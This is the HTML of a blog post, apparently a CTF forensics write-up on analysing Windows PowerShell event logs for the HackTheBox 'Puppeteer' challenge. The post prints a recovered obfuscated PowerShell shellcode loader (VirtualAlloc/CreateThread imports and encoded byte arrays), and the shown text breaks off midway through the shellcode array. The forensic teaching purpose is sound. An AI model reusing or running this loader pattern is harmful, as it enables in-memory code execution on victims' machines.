<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HTB Cyber Apocalypse CTF - Forensics - Puppeteer" /><meta name="author" content="gore-ez-knee" /><meta property="og:locale" content="en" /><meta name="description" content="Challenge Info" /><meta property="og:description" content="Challenge Info" /><link rel="canonical" href="https://gore-ez-knee.github.io/posts/htb-ca-2022-forensics-puppeteer/" /><meta property="og:url" content="https://gore-ez-knee.github.io/posts/htb-ca-2022-forensics-puppeteer/" /><meta property="og:site_name" content="Gore-Ez-Knee" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-14T14:30:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB Cyber Apocalypse CTF - Forensics - Puppeteer" /><meta name="twitter:site" content="@gore_ez_knee" /><meta name="twitter:creator" content="@gore-ez-knee" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"gore-ez-knee"},"dateModified":"2022-05-14T14:30:00-05:00","datePublished":"2022-05-14T14:30:00-05:00","description":"Challenge Info","headline":"HTB Cyber Apocalypse CTF - Forensics - Puppeteer","mainEntityOfPage":{"@type":"WebPage","@id":"https://gore-ez-knee.github.io/posts/htb-ca-2022-forensics-puppeteer/"},"url":"https://gore-ez-knee.github.io/posts/htb-ca-2022-forensics-puppeteer/"}</script><title>HTB Cyber Apocalypse CTF - Forensics - Puppeteer | Gore-Ez-Knee</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Gore-Ez-Knee"><meta name="application-name" content="Gore-Ez-Knee"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Gore-Ez-Knee</a></div><div class="site-subtitle font-italic">Nerd</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/gore-ez-knee" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/gore_ez_knee" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gore.ez.knee','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB Cyber Apocalypse CTF - Forensics - Puppeteer</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1700 400'%3E%3C/svg%3E" data-src="/assets/img/post_images/ctf/htb-ca-2022/htb-ca-ctf-banner.png" class="preview-img bg" alt="Preview Image" width="1700" height="400" data-proofer-ignore><h1 data-toc-skip>HTB Cyber Apocalypse CTF - Forensics - Puppeteer</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/gore_ez_knee">Gore-Ez-Knee</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1652556600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-14 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1040 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><h2 id="challenge-info"><span class="mr-2">Challenge Info</span><a href="#challenge-info" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Difficulty: ★☆☆☆</p><blockquote><p>Planet Longhir is known for it’s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation’s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite’s location was leaked since it is a top-sercret that only Galactic Federation’s council is aware of. Help her analyse the Council’s HQ event logs and solve this mystery.</p></blockquote><h2 id="tools-used"><span class="mr-2">Tools Used</span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>PowerShell ISE<li>CyberChef<li>Event Log Explorer</ul><h2 id="process"><span class="mr-2">Process</span><a href="#process" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="download-artifacts"><span class="mr-2">Download Artifacts</span><a href="#download-artifacts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Clicking <code class="language-plaintext highlighter-rouge">Download</code> for the challenge provides us a zip file of evtx files which are Windows Event Log files.</p><p><img data-src="/assets/img/post_images/ctf/htb-ca-2022/forensics/puppeteer/snapshot1.jpg" alt="" data-proofer-ignore></p><p>They’re a little different than traditional log files in that they are stored in a binary format. Using Windows Event Viewer is how they are normally viewed, but it’s not ideal when trying to filter, parse, and search message fields during an investigation. Some options that are available are using tools such as <a href="https://github.com/Velocidex/evtx">dumpevtx</a> from Velocidex (The company behind Velociraptor) to a tool I learned about taking GCFA: Event Log Explorer.</p><p><img data-src="/assets/img/post_images/ctf/htb-ca-2022/forensics/puppeteer/snapshot2.jpg" alt="" data-proofer-ignore></p><p>The tool is free for personal, non-commercial use, and a license for it is available for $199. Since I haven’t used it since I took GCFA, I thought it be interesting to try it out again.</p><blockquote class="prompt-info"><div><p>Event Log Explorer is not required to solve this challenge. You can <code class="language-plaintext highlighter-rouge">cat</code> out the files and manually parse through them to find the ScriptBlocks.</p></div></blockquote><h3 id="powershell-event-logs"><span class="mr-2">PowerShell Event Logs</span><a href="#powershell-event-logs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>When I was doing a forensics challenge on HackTheBox, I ran into obfuscated code which ran PowerShell scripts. I remember hearing about PowerShell script logging, but had never enabled it before. I found this article by Mandiant which detailed out how to enable PowerShell logging in Windows 10 since it isn’t enabled by default <a href="https://www.mandiant.com/resources/greater-visibilityt">link</a>.</p><p>With PowerShell being a popular technology used to execute code on Windows, if I ever see PowerShell event logs I flock to them first. Looking in the Logs directory, we can see 3 PowerShell evtx files:</p><ul><li><code class="language-plaintext highlighter-rouge">Windows Powershell.evtx</code><li><code class="language-plaintext highlighter-rouge">Microsoft-Windows-Powershell/Operational.evtx</code><li><code class="language-plaintext highlighter-rouge">Microsoft-Windows-Powershell/Admin.evtx</code></ul><p>The first file <code class="language-plaintext highlighter-rouge">Windows Powershell.evtx</code> has a handful of logs. There are also event IDs of 400, 600, and 800:</p><p><img data-src="/assets/img/post_images/ctf/htb-ca-2022/forensics/puppeteer/snapshot3.jpg" alt="" data-proofer-ignore></p><ul><li>EID 400: The engine status is changed from None to Available - This indicates the start of a PowerShell activity, whether remote or local.<li>EID 600: Proivder “X” is Started - Indicates that a provider is starting to perform a PowerShell activity on the system.<li>EID 800: Pipeline Execution Details: Shows pipeline execution information of a command executed by PowerShell</ul><p>We can see that some commands were ran by PowerShell at ~8:40:31 AM. The details from the <code class="language-plaintext highlighter-rouge">Windows PowerShell.evtx</code> don’t give us too much detail, but we can see what the script name was, where is it was ran from, the user who ran it, and the command line arguments with some sketch variables ($tNZvQCljVk and $OleSPrlmhB).</p><p><img data-src="/assets/img/post_images/ctf/htb-ca-2022/forensics/puppeteer/snapshot4.jpg" alt="" data-proofer-ignore></p><p>Let’s move over to the <code class="language-plaintext highlighter-rouge">Microsoft-Windows-Powershell/Operational.evtx</code> logs. Using the pivot point time of 8:40:31 AM, there are events: 4103 (Executing Pipeline) and 4104 (Execute a Remote Command).</p><p><img data-src="/assets/img/post_images/ctf/htb-ca-2022/forensics/puppeteer/snapshot5.jpg" alt="" data-proofer-ignore></p><p>The 4104 event shows the entire scriptblock that was executed and houses some clear obfuscation</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="nv">$OleSPrlmhB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@</span><span class="w">

</span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$stage1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x99</span><span class="p">,</span><span class="w"> </span><span class="nx">0x85</span><span class="p">,</span><span class="w"> </span><span class="nx">0x93</span><span class="p">,</span><span class="w"> </span><span class="nx">0xaa</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb3</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa6</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb9</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa3</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb7</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb9</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb3</span><span class="p">;</span><span class="w">
</span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$stage2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">xac</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xff</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe0</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa2</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa4</span><span class="p">,</span><span class="w"> </span><span class="nx">0xbb</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xb7</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0x8e</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe4</span><span class="p">,</span><span class="w"> </span><span class="nx">0xa5</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">,</span><span class="w"> </span><span class="nx">0xe1</span><span class="p">;</span><span class="w">

</span><span class="nv">$tNZvQCljVk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-memberDefinition</span><span class="w"> </span><span class="nv">$OleSPrlmhB</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"Win32"</span><span class="w"> </span><span class="nt">-namespace</span><span class="w"> </span><span class="nx">Win32Functions</span><span class="w"> </span><span class="nt">-passthru</span><span class="p">;</span><span class="w">

</span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="nv">$HVOASfFuNSxRXR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x2d</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x35</span><span class="p">,</span><span class="nx">0x21</span><span class="p">,</span><span class="nx">0x39</span><span class="p">,</span><span class="nx">0x1d</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x80</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x03</span><span class="p">,</span><span class="nx">0xb4</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xb1</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x80</span><span class="p">,</span><span class="nx">0x87</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xde</span><span class="p">,</span><span class="nx">0x66</span><span class="p">,</span><span class="nx">0x9b</span><span class="p">,</span><span class="nx">0x9b</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0xa3</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x7d</span><span class="p">,</span><span class="nx">0xed</span><span class="p">,</span><span class="nx">0xb0</span><span class="p">,</span><span class="nx">0xad</span><span class="p">,</span><span class="nx">0xd3</span><span class="p">,</span><span class="nx">0xfd</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0xdc</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x3c</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x80</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x93</span><span class="p">,</span><span class="nx">0xed</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0xb7</span><span class="p">,</span><span class="nx">0x50</span><span class="p">,</span><span class="nx">0xa9</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0xda</span><span class="p">,</span><span class="nx">0xd3</span><span class="p">,</span><span class="nx">0xde</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0xa3</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0xa5</span><span class="p">,</span><span class="nx">0xb6</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x81</span><span class="p">,</span><span class="nx">0x95</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x91</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0x32</span><span class="p">,</span><span class="nx">0x87</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x9c</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0xe5</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x07</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0xdc</span><span class="p">,</span><span class="nx">0x7d</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0xe9</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0xd2</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0xf5</span><span class="p">,</span><span class="nx">0xd9</span><span class="p">,</span><span class="nx">0x94</span><span class="p">,</span><span class="nx">0xe8</span><span class="p">,</span><span class="nx">0x00</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0x09</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x95</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x91</span><span class="p">,</span><span class="nx">0xf5</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0xb7</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0xdd</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x95</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x91</span><span class="p">,</span><span class="nx">0xcd</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x8f</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x01</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x3d</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0xc3</span><span class="p">,</span><span class="nx">0x38</span><span class="p">,</span><span class="nx">0x9a</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x8c</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x6f</span><span class="p">,</span><span class="nx">0xa6</span><span class="p">,</span><span class="nx">0xa2</span><span class="p">,</span><span class="nx">0xe3</span><span class="p">,</span><span class="nx">0x8e</span><span class="p">,</span><span class="nx">0xe2</span><span class="p">,</span><span class="nx">0xe3</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x87</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x37</span><span class="p">,</span><span class="nx">0x99</span><span class="p">,</span><span class="nx">0x50</span><span class="p">,</span><span class="nx">0x3d</span><span class="p">,</span><span class="nx">0x71</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x34</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x6d</span><span class="p">,</span><span class="nx">0xd3</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd4</span><span class="p">,</span><span class="nx">0xe8</span><span class="p">,</span><span class="nx">0x11</span><span class="p">,</span><span class="nx">0x79</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xc3</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x85</span><span class="p">,</span><span class="nx">0x98</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x35</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0xa6</span><span class="p">,</span><span class="nx">0xf7</span><span class="p">,</span><span class="nx">0xd6</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x04</span><span class="p">,</span><span class="nx">0x9d</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x3b</span><span class="p">,</span><span class="nx">0xb9</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span 